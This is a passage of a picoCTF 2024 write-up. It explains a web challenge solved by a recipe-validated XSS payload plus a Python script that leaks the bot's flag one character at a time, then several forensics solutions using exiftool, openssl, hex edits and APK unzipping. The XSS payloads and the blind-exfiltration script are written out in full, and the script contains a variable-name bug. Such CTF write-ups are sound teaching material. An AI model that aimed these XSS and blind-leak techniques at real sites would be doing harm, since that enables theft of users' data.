This is more of a conditional statement, if the pathname is ```/``` the ```content-type``` header is set to ```text/html```, if the pathname is ```/index.js``` the ```content-type``` is set to ```text/javascript```. Lastly, if the pathname is ```/remoteCraft```, the code parses a URL search parameter named recipe and extracting two variables, "recipe" and "xss". It then performs several assertions to validate the input:
```
assert(typeof xss === 'string'): This checks that xss is a string.
assert(xss.length < 300): This checks that the length of xss is less than 300 characters.
assert(recipe instanceof Array): This checks that recipe is an array.
assert(recipe.length < 50): This checks that the length of recipe is less than 50.
for (const step of recipe) { ... }: This iterates over each element in the recipe array.
assert(step instanceof Array): This checks that each element in the recipe array is an array.
assert(step.length === 2): This checks that each element in the recipe array has a length of 2.
for (const element of step) { ... }: This iterates over each element in the current step array.
assert(typeof xss === 'string'): This checks that the current element is a string.
assert(element.length < 50): This checks that the length of the current element is less than 50 characters.
```
Now, when all these conditions are met we get a message that says ```visiting```, if the conditions aren't met, then we get the ```invalid recipe``` message. 

Well, the recipes are stored in the ```index.js``` file 

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8251a784-bc9e-4b65-9351-b5c1960451cb)

Lets analyze this script

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c30850ce-ad0f-4450-a49e-0aad7e66099c)

So we have the recipe and the elements array

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9a0bb245-ee60-4750-8191-81f65c534aee)

This script defines a function called evaluate that takes any number of arguments and checks if they match a recipe in an array. If the first and second arguments match ing equal to 'XSS', the script evaluates the xssproperty of thestateobject as a JavaScript expression using theevalfunction. If theresultis not equal to'XSS', the function simply returns the result.

Now that we've seen what the scripts are doing lets start the docker instance

You can run the ```index.mjs``` script using node

command:```node index.mjs```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/30309d42-f1d5-41a5-bc93-15375836c4b4)

We can navigate to the url ```http://127.0.0.1:8080``` on the chromum browser

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2652b957-b453-4970-b81f-ca7d76bdda1f)

We have 4 elements here, what happens when we mix fire and water??

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/088f27c1-9c90-48ee-b531-3a747ac81c16)

So ```fire + water = steam```, how about air and water??

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/89a75b29-ca70-42ac-9969-27e8ceb1fd17)

So, ```air + water = mist```, now this means those 4 elements are the base recipes, so it's safe to say every other recipes are being formed from these base recipes. Now, if you check the index.js file you'll see that the ```xss = exploit + web design```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/a299f4e4-86a6-4b8e-9ee5-39f7ee18afa5)

But then then ```exploit``` also has recipes it's produced from. So, to get the right recipe we have to get the base recipes right.

When you try to get the base recipes for xss, you should have something like this

```
[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]]
```
Now, we've explained conditions to meet if we want to execute xss, you can check the explanation for this above. So at the end of the day we can craft this payload

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"alert(1)"}
```
So, if the recipes are right we get a message that says "visiting", also our xss query gets executed, but if the recipes aren't right we get an "invalid recipe" message

Lets try this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/64a909a6-3c4a-4c57-a081-011165f2244a)

The moment we got the "visiting" message, another chromium instance popped up executing the xss query.

Now, the question is, how do we exfiltrate data with this??

I mean this was the part where nyself and my teammates got stuck. We thought of webrtc, but then webrtc was disabled on the chromium browser so that wasn't possible. We could have used the ```fetch()``` function though but we can't because of the ```connect-src``` in the csp header which limits the domian we connect to or websockets. We were stuck here for days trying to bypass csp hehe

But then we tried something else, how about instead of trying to exfiltrate all the data at once we kind of just check the server for each characters and then we try to make an event happen if the character is present. 

If you are familiar with Blind SQL injection with conditional responses you'll understand what I'm trying to say, for Blind SQL injection you get a response when your query is true. We'll be using the same approach here.

Lets craft a payload like this

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'p'){alert(1);}"}
```
Now, what this does is that, if the recipes are correct it gives us the "visiting" message and then spawns another chromium instance, if the first character of the flag property in the json object is "p" is present the ```alert``` statement gets executed, if the first character isn't "p", the ```alert``` statement doesn't get executed

Lets try this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/41301228-cf0d-4805-ae30-044bc1aeb50a)

The alert statement got executed which means the character "p" is the first character, lets change the character to say "Q"

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'q'){alert(1);}"}
```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/cf01e480-0f76-4c55-8486-9719f96befca)

Well, the alert statement didn't get executed which means the character "q" isn't the first character of the flag propert

It was easier to test this method here since we know  the fake flag to be ```picoCTF{test_flag}```, so you can confirm if these characters are in the flag property using that query. From the fake flag we know the 10th index in the flag property has the "s" character, lets confirm this with our query

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[10] == 's'){alert(1);}"}
```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/79a40108-dbb5-43b4-b3c5-5ba3c423cfca)

Yeah, the query works😎

Now, how do we test this on the challenge instance??

The challenge instance doesn't spawn a chromium browser even if our recipe is correct, all we get is just the "visiting" message. So in this case we won't be able to tell if a character is in the flag property or not because we don't know if our alert statement is getting executed or not.

So we came up with something else, my teammate wrote a python script

```python
import requests
import json
import string

def search():
    # binary search algo implementation
    pass

def doxss(xss):
    return json.dumps({
    "recipe": [['Water', 'Earth'], ['Water', 'Air'], ['Mist', 'Fire'], ['Mud', 'Fog'], ['Fire', 'Earth'], ['Magma', 'Mud'], ['Obsidian', 'Water'], ['Sludge', 'Hot Spring'], ['Steam Engine', 'Fire'], ['Earth', 'Air'], ['Heat Engine', 'Dust'], ['Sand', 'Fire'], ['Obsidian', 'Earth'], ['Hot Spring', 'Steam Engine'], ['Computer Chip', 'Electricity'], ['Glass', 'Software'], ['Computer Chip', 'Steam Engine'], ['Computer Chip', 'Fire'], ['Artificial Intelligence', 'Data'], ['Software', 'Encryption'], ['Vulnerability', 'Cybersecurity'], ['Electricity', 'Software'], ['Magma', 'Mist'], ['Rock', 'Air'], ['Program', 'Internet'], ['Exploit', 'Web Design']],
    "xss": xss})

flag = "picoCTF{"
idx = 8
url = 'http://rhea.picoctf.net:64687/remoteCraft'
# url = 'http://rhea.picoctf.net:61582/remoteCraft'

charset = string.printable

while True:
    print(f"Flag: {flag}")
    for string in charset:
        print(f"Trying: {flag + string}")

        isFound = False
        chr = string
        xss = "if (JSON.parse(atob(window.location.hash.slice(1))).flag[" + str(idx) + "] == " + "'" + string + "'" +"){document.body.innerHTML+=`<iframe srcdoc=\"<script src='${location.origin}//'>\"></iframe>`;};"
        print(xss)
        cnt = 0

        while cnt <= 15:
            try:
                full = f"{url}?recipe={requests.utils.quote(doxss(xss))}"
                requests.get(full)    
            except ConnectionRefusedError:
                flag += charset[charset.index(string)-1]
                idx += 1
                cnt = 15
                is_Found = True
                continue

            if isFound:
                break

            cnt += 1
            
        # print(f"[Counter: {cnt}, isFound: {isFound}]")

    if len(flag) != 0 and flag[-1] != '}':
        break
```
This script performs a binary search to find the missing character in a flag by sending GET requests to a URL with a parameter 'recipe' set to a JSON object containing an XSS payload. The iframe is being used to trigger a ConnectionRefusedError to determine if the current character being tested is the missing character in the flag. The iframe is being added to the body that contains a script from the same origin as the parent page. This is a common technique used in XSS attacks to bypass the same-origin policy and execute scripts from the same origin as the parent page. In this case, the iframe in the flag by triggering a ConnectionRefusedError when the correct character is found. All you have to do is change the url in the script to that of your challenge instance and then run the script

PS: This script requires good internet connection to get accurate results

command:```python bankai.py```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2c00e7e2-8f50-4f15-a9a2-a72c7a9a2331)

You can see that the script crashed when it got to the character "l", this means the character "l" is indeed the 8th index of the flag. 

To get the 9th index

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6948b717-b7df-49a2-bdbe-bec2ced975a7)

Just edit those 2 variables and run the script again
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/497f0327-e211-40f3-a456-4f8342248641)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/724bb9f6-df25-431f-9542-56251bfd1b74)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/326b6a6d-077c-4b5b-899a-871f9cb526a7)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6a2fa5ab-4d7f-4b2b-9d67-9da4e9081e61)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/486588d2-1f7f-4a60-80c2-698f90fb9370)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/38d8f004-b63f-4048-acf9-c71186e39fb1)

You'll keep running this until you get to the last character, the flag length is quite long though

FLAG:- ```picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}```





# Forensics

## Scan Surprise (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/02e8b578-e29f-42da-b072-d81117c93104)

We actually don't need the challenge instance, just download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/87b27ff4-5079-46c9-b535-f3b86cedf844)

We have a png image, lets check the content of this image

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/65a22f99-c35a-4fc2-8c1e-f9421148e91c)

We have this qr code, we can scan this using this [website](https://scanqr.org/)

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c26768eb-13da-463b-9b63-84772daaac98)

We got our flag

FLAG:- ```picoCTF{p33k_@_b00_19eccd10}```

---------------------------------------------

## Verify (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/675317f3-d328-4807-970d-c77c14c7e93b)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d5ac4b25-1bc4-4071-abf5-d59b667459a9)

We have a ```checksum.txt``` file and also a ```decrypt.sh``` file. The ```files``` directory contains 100+ files, in these files we have different checksums

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/468997e2-6dbc-4205-ab3f-5cbe8b4a0133)

So we have that particular sha-256 hash, and then we have the openssl command in the "decrypt.sh" file.

First, lets look for the file that has this sha-256 hash ```55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a```. We can use the grep command for this

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/verify/home/ctf-player/drop-in]
└─$ cd files                                                                             
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/home/ctf-player/drop-in/files]
└─$ sha256sum * | grep "55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a"
55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a  2cdcb2de
```
The file ```2cdcb2de``` contains our sha-256 hash. Now, lets use openssl to decrypt this

command:```openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -salt -in files/2cdcb2de -k picoCTF -out encrypted.data```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f964f0e9-eee4-4192-949d-4ed947d8bd20)

Yup, that's our flag

FLAG:- ```picoCTF{trust_but_verify_2cdcb2de}```

-------------------------------------------

## CanYouSee (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b78943e4-2731-413b-b157-b48e69f4e49e)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9e752d62-81fa-4f3d-928d-cb88e5a7eefa)

We've got a jpg image, lets run exiftool on this image

command:```exiftool ukn_reality.jpg```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/528f8a0f-329f-48ab-bd0f-d2e13f2e8876)

That's a base64 encoded text, lets decode hehe

command:```echo "cGljb0NURntNRTc0RDQ3QV9ISUREM05fNmE5ZjVhYzR9Cg==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/canyousee]
└─$ echo "cGljb0NURntNRTc0RDQ3QV9ISUREM05fNmE5ZjVhYzR9Cg==" | base64 -d                                    
picoCTF{ME74D47A_HIDD3N_6a9f5ac4}
```
Nice Nice, we got our flag

FLAG:- ```picoCTF{ME74D47A_HIDD3N_6a9f5ac4}```

---------------------------------------------------------------

## Secret of the Polygot (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8a8180c1-2800-4d2f-b929-fdd619d40218)

Download the challenge file

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/69d8cb34-bde8-4c7f-9261-46988219b81d)

We've got a pdf file, lets view the content of this pdf file using a pdf viewer

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d1e21b27-1c5c-46fb-a41c-2e826fd0ce77)

oops. we've only got half of the flag. Should we form the other half ourselves??😂

Well, we don't need to do that. Try using the ```file``` command to check the kind of file that file is

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/secret_of_the_polygot]
└─$ file flag2of2-final.pdf 
flag2of2-final.pdf: PNG image data, 50 x 50, 8-bit/color RGBA, non-interlaced
```
As you can see it is a png image not even a pdf file. What we can do is change the file extension from ```.pdf``` to ```.png```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4db0204c-2c28-4957-99bf-fe5b0b98f3af)

Yup that's the other half of the flag😎

FLAG:- ```picoCTF{f1u3n7_1n_pn9_&_pdf_1f991f77}```

---------------------------------

## Mob Psycho (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/99d589d4-8858-4167-814d-82cfd38130c4)

Download the APK file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ ls -la
total 4048
drwxr-xr-x 2 bl4ck4non bl4ck4non    4096 Mar 24 15:09 .
drwxr-xr-x 7 bl4ck4non bl4ck4non    4096 Mar 24 15:08 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non 4136368 Mar 24 15:09 mobpsycho.apk
```
We could have extracted this using ```apktool``` but then it won't give us the flag, so lets just unzip

command:```unzip mobpsycho.apk```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ ls -la
total 14148
drwxr-xr-x  4 bl4ck4non bl4ck4non    4096 Mar 24 15:18 .
drwxr-xr-x  7 bl4ck4non bl4ck4non    4096 Mar 24 15:08 ..
-rw-r--r--  1 bl4ck4non bl4ck4non    4056 Jan  1  1981 AndroidManifest.xml
drwxr-xr-x  4 bl4ck4non bl4ck4non    4096 Mar 12 01:06 META-INF
-rw-r--r--  1 bl4ck4non bl4ck4non 9028868 Jan  1  1981 classes.dex
-rw-r--r--  1 bl4ck4non bl4ck4non  463856 Jan  1  1981 classes2.dex
-rw-r--r--  1 bl4ck4non bl4ck4non    3700 Jan  1  1981 classes3.dex
-rw-r--r--  1 bl4ck4non bl4ck4non 4136368 Mar 24 15:09 mobpsycho.apk
drwxr-xr-x 41 bl4ck4non bl4ck4non    4096 Mar 12 01:06 res
-rw-r--r--  1 bl4ck4non bl4ck4non  824736 Jan  1  1981 resources.arsc
```
Well, at this point I started asking myself why the challenge creator gave it the name "Mob Psycho" because it is so unrelated.

To get the flag, try searching for files with the ```.txt``` extensions

command:```find . -type f -name "*.txt"```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ find . -type f -name "*.txt"
./res/color/flag.txt
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ cat res/color/flag.txt 
7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f37343664666133397d
```
We get that ciper, using [dcode.fr](https://www.dcode.fr/cipher-identifier) we can determine the kind of cipher this is

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/e8b7078c-4772-49a6-b73e-e56d63808dc0)

Ascii code, nice. Lets decode

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b07e8bf6-75de-40e2-b82e-dd9f707ff33c)

Successfully gotten the flag

FLAG:- ```picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_746dfa39}```

---------------------------- 

## endianness-v2 (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b6510f0b-69ac-4614-bbd4-df5b95614e58)

Download the challenge file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/endianness-v2]
└─$ ls -la
total 12
drwxr-xr-x  2 bl4ck4non bl4ck4non 4096 Mar 26 13:41 .
drwxr-xr-x 10 bl4ck4non bl4ck4non 4096 Mar 25 17:34 ..
-rw-r--r--  1 bl4ck4non bl4ck4non 3428 Mar 26 13:41 challengefile
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/endianness-v2]
└─$ file challengefile 
challengefile: data
```
Lets view the hex of the challenge file 

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8678bb3e-91ae-4468-ba10-7bd301345700)

You'll see that the starting byte for this file resembls that of a jpg file, but then it's actually swapped. Normal starting byte for a jpeg file is ```FF D8 FF E0``` but then from the hex we have this ``` e0ff d8ff```

To correct this, we'll be using this python script

```python
import textwrap

def swap_chunks(data):
    chunks = []
    swapped_data = ""

    for i in range(0, len(data), 4):
        chunks.append(data[i:i+4])

    lt_idx = chunks[-1]
    chunks = chunks[:-1]
    swapped = b""

    for i in range(len(chunks)):
        swapped += chunks[i][::-1]
            

    return swapped

def main():
    input_file = 'challengefile'
    output_file = 'dump'

    with open(input_file, 'rb') as f:
        file_data = f.read()

    swapped_data = swap_chunks(file_data)


    with open(output_file, 'wb') as f:
        f.write(swapped_data)


if __name__ == "__main__":
    main()
```
This script reads binary data from a file named 'challengefile', swaps the order of every four bytes within the data, and then writes the swapped data to a file named 'dump'.

Lets run this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/0fc6483b-6406-41a1-bc3f-741751a062cf)

We got a jpeg file after running the script. Lets view this image using an image viewer

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/5a5db82e-9b53-4b33-8d19-35038a78420f)

We got our flag

FLAG:- ```picoCTF{cert!f1Ed_iNd!4n_s0rrY_3nDian_94cc03f3}```

------------------------------

## Blast from the Past (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/5fc1f823-004f-48bf-87cb-e4c64d5aea61)

The task here is to set the timestamps on this jpeg to ```1970:01:01 00:00:00.001+00:00```

Lets download the file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ ls -la
total 2796
drwxr-xr-x 2 bl4ck4non bl4ck4non    4096 Mar 25 05:49 .
drwxr-xr-x 8 bl4ck4non bl4ck4non    4096 Mar 25 05:46 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non 2851929 Mar 25 05:46 original.jpg
```
When you run ```exiftool``` on the image, you'll get this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2a2970a2-1c8d-4b44-8d2f-5f03f288379a)

To know the timestamps to specifically edit, lets try to submit the original jpg file. We have 2 instances, one is for submitting the modified jpeg, while the other instance is used for checking the modified jpeg.

Lets try to submit this original jpeg so we know what to edit

command
```
nc -w 2 mimas.picoctf.net 58576 < original.jpg (to submit)
nc mimas.picoctf.net 54978 (to check) (notice how I didn't include the "-d", well it is not needed)
```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/a9580e96-f2eb-4423-b97b-02e0d262bfd5)

Lets edit the ```ModifyDate```

command:```exiftool -ModifyDate="1970:01:01 00:00:00" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -ModifyDate="1970:01:01 00:00:00" original.jpg
    1 image files updated
```
Good, now lets submit and check the modified jpg file

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4dd4b3b9-d843-4a07-aac4-681da6c0b2db)

Good, we've completed the first tag, the second tag requires us to modify ```DateTimeOriginal```

Chotto matte, what if instead of editing the timestamps one by one we just edit all at once??

Lets try it

command:```exiftool -AllDates="1970:01:01 00:00:00" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -AllDates="1970:01:01 00:00:00" original.jpg  
    1 image files updated
```
Lets submit and check again

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/a63a4852-90ea-4470-a701-70bda8416b5c)

Good, we jumped right to the 4th tag, to edit the composite ```SubSecCreateDate```

command:```exiftool -SubSecCreateDate="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecCreateDate="1970:01:01 00:00:00.001" original.jpg
    1 image files updated
```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c5103756-d18c-482d-89f1-2073ee3bcf46)

Good, for the 5th tag we have to edit the composite ```SubSecDateTimeOriginal```

command:```exiftool -SubSecDateTimeOriginal="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecDateTimeOriginal="1970:01:01 00:00:00.001" original.jpg
    1 image files updated
```
Lets submit and check the next timestamp to edit

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/5c3f594b-273b-4122-bb3b-a15bd2058bb2)

For the 6th tag we have to edit the composite ```SubSecModifyDate```

command:```exiftool -SubSecModifyDate="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecModifyDate="1970:01:01 00:00:00.001" original.jpg      
    1 image files updated
```
Lets submit and view

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/0d1ce5cb-5258-4695-95a7-59d3711b6660)

Good, we are now on the 7th tag, well for this 7th tag exiftool didn't really help me out. So I uded a hexeditor "imex". To install you can just run ```sudo apt install imhex```. You actually can use any hexeditor of your choice

We'll edit the jpg file using this, you'll know why soon

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/0415342c-b781-4909-b91a-75499136936b)

Now, scroll down to the bottom, you'll find something interesting hehe

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/aec7fd65-96df-4a0f-8a59-93e31ff70426)

From the above screenshot you can see something like this ```Image_UTC_Data1700513181420``` and we know that the 7th tag which is the last one has to do with modifying the samsung timestamp.

Well, the question should be, how does samsung store their timestamp

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2327c2e2-ab95-4345-8719-bd1e1effa5b9)

As we can see samsung stores their timestamp more like in unix timestamps, lets try to convert the unix timestamp we found in the jpeg hex.

unix timestamp:```1700513181420```

We can [website](https://www.unixtimestamp.com/) to convert this to a proper date and time

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c34509b5-eab6-413a-88e8-ba590f40b71a)

That's the time and date we have on the samsung timestamp, so we have to edit this. Since we know the date we want to edit to which is ```1970:01:01 00:00:00.001+00:00``` we'll just convert this to unix timestamp

Lets do that

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c54f1ad1-c121-488f-9adc-f6f7e9f31887)

You can see that the unix timestamp for this date is ```0```, since well'll be using ```GMT+1``` (GMT+1 refers to Greenwich Mean Time plus one hour), we can say our unix timestamp for that given date is ```01``` which in hex is represented as ```30 31```.

Now, this means we'll edit from this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/49dda1d5-d7f9-415b-9ea2-8305c99b9d0d)

To this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9713130a-e0c7-4f0e-8f17-cf6988ee79bf)

Now lets submit this modified image and check it

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f472155f-eeb6-44cb-b6b4-a5a0e6957a11)

We got our flag hehe😎

FLAG:- ```picoCTF{71m3_7r4v311ng_p1c7ur3_ed953b57}```

----------------------------------

## Dear Diary (400 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/3d1fb30e-09df-452e-b443-cd668f530f5e)

Pico has a culture of releasing disk images challs as as part of their forensics chall every year, well this was easier compared to last year's own. Took me less than 30 mins to figure out hehe😎

Lets jump right into it

Dowload the challenge file and extract the disk image

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/0200d324-4181-4ae1-8db5-30b5be7906d8)

From the hint provided

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/23b817ef-795e-433f-9f5c-cf29235d1158)

It's so obvious we can't mount the disk image using our terminal, so we'll mount this disk image using autopsy. Autopsy is a tool that comes preinstalled on kali

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/53d336e8-7b0d-46ec-96eb-3d5943b37a58)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/178c4aa4-4f97-4e20-80fa-31d60844ec95)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2dc5d912-787b-4edf-aabc-9abd46d3953d)
